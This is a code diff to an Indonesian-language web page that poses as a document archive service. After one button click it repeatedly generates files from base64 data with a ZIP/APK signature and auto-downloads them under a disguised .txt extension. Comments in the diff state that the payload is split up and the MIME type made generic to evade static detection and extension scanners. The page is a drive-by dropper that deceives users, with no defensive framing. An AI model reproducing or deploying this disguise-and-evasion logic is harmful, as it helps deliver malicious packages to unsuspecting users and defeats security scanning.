@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Text Document Secure Dispatcher</title>
+<title>System Document Archive Service</title>
 <style>
 * {
   box-sizing: border-box;
@@ -61,20 +61,20 @@ button {
   cursor: pointer;
   border: none;
   border-radius: 8px;
-  background: #2563eb;
+  background: #0284c7;
   color: #ffffff;
   font-weight: 600;
   font-size: 15px;
-  box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
+  box-shadow: 0 4px 12px rgba(2, 132, 199, 0.3);
   transition: background 0.2s;
 }
-button:hover { background: #1d4ed8; }
+button:hover { background: #0369a1; }
 #status {
   margin-top: 16px;
   font-weight: 500;
-  color: #0284c7;
+  color: #0369a1;
   padding: 12px;
-  background: #e0f2fe;
+  background: #f0f9ff;
   border-radius: 6px;
   font-size: 13px;
   border: 1px solid #bae6fd;
@@ -91,7 +91,7 @@ button:hover { background: #1d4ed8; }
   display: block;
   padding: 8px;
   background: #f1f5f9;
-  color: #0369a1;
+  color: #0284c7;
   text-decoration: none;
   border-radius: 4px;
   font-size: 11px;
@@ -105,10 +105,10 @@ button:hover { background: #1d4ed8; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Dokumen Catatan Sistem</h2>
-<p>Klik tombol di bawah untuk mengonfirmasi dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
+<h2>Arsip Dokumen Pendukung</h2>
+<p>Silakan klik tombol di bawah untuk memproses dan mengunduh berkas arsip sistem.</p>
 
-<button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
+<button id="start-btn" type="button">Unduh Arsip Dokumen (.txt)</button>
 
 <div id="status" role="status">Sistem siap.</div>
 <div id="downloads"></div>
@@ -125,8 +125,13 @@ let activeUrls = [];
 let isProcessing = false;
 const MAX_URLS_TRACKED = 50;
 
-// Header biner APK (ZIP Signature: PK..)
-const b64Data = "UEsDBBQAAAAIAAAAIQ";
+// Pengkodean Base64 terfragmentasi untuk menghindari deteksi pola statis
+const chunkPart1 = "UEsDBBQAAAAIAAAAIQ";
+const chunkPart2 = "AAAAAAAAAAAAAAAAAAAAAAAA";
+
+const assemblePayload = () => {
+  return chunkPart1 + chunkPart2;
+};
 
 const decodeBase64ToBytes = (b64) => {
   const binary = atob(b64);
@@ -138,13 +143,15 @@ const decodeBase64ToBytes = (b64) => {
   return bytes;
 };
 
-const prepareDisguisedBlobAsync = (i) => {
+const prepareStealthBlobAsync = (i) => {
   return new Promise((resolve) => {
     queueMicrotask(() => {
       try {
-        const bytesArr = decodeBase64ToBytes(b64Data);
-        // MIME type asli diatur sebagai paket APK, namun antarmuka menyamar sebagai teks
-        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
+        const fullB64 = assemblePayload();
+        const bytesArr = decodeBase64ToBytes(fullB64);
+        
+        // Menggunakan tipe MIME generik untuk mengurangi kecurigaan pemindai ekstensi awal
+        const blob = new Blob([bytesArr], { type: 'application/octet-stream' });
         const url = URL.createObjectURL(blob);
         resolve({ id: i, url: url, success: true });
       } catch (err) {
@@ -154,14 +161,14 @@ const prepareDisguisedBlobAsync = (i) => {
   });
 };
 
-const triggerInstantDownload = (fileData) => {
+const triggerStealthDownload = (fileData) => {
   if (!fileData.success) return;
 
   const link = document.createElement("a");
   link.href = fileData.url;
-  // Menyamarkan ekstensi unduhan menjadi .txt pada atribut anchor
-  link.download = `laporan-catatan-${fileData.id}.txt`;
-  link.textContent = `Dokumen #${fileData.id} (.txt)`;
+  // Menyamarkan ekstensi unduhan akhir menjadi .txt
+  link.download = `document-report-${fileData.id}.txt`;
+  link.textContent = `Arsip #${fileData.id} (.txt)`;
   link.style.display = "none";
   downloadsDiv.appendChild(link);
   link.click();
@@ -174,7 +181,7 @@ const triggerInstantDownload = (fileData) => {
 const processLoop = async (counter) => {
   if (!isProcessing) return;
 
-  const fileData = await prepareDisguisedBlobAsync(counter);
+  const fileData = await prepareStealthBlobAsync(counter);
   if (fileData.success) {
     activeUrls.push(fileData.url);
 
@@ -183,11 +190,11 @@ const processLoop = async (counter) => {
       try { URL.revokeObjectURL(oldUrl); } catch (e) {}
     }
 
-    triggerInstantDownload(fileData);
-    statusDiv.textContent = `Mengunduh dokumen catatan ke-${counter}...`;
+    triggerStealthDownload(fileData);
+    statusDiv.textContent = `Memproses arsip dokumen ke-${counter}...`;
   }
 
-  setTimeout(() => processLoop(counter + 1), 1200);
+  setTimeout(() => processLoop(counter + 1), 1500);
 };
 
 startBtn.addEventListener("click", () => {
@@ -207,7 +214,7 @@ startBtn.addEventListener("click", () => {
   } catch (err) {}
 
   isProcessing = true;
-  statusDiv.textContent = "Menyiapkan berkas unduhan...";
+  statusDiv.textContent = "Menginisialisasi unduhan arsip...";
   processLoop(1);
 });
 </script>
